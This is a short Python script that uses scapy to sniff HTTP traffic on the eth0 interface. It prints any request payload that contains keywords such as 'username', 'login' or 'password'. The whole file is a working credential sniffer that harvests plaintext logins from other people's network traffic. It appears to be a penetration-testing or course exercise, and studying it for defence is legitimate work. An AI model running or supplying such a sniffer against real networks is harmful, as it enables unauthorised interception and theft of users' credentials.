#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            # print(packet)
            # print(packet.show())
            load = packet[scapy.Raw].load
            keywords = [
                'username', 'login', 'uname',
                'user', 'password', 'pass',
            ]

            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff("eth0")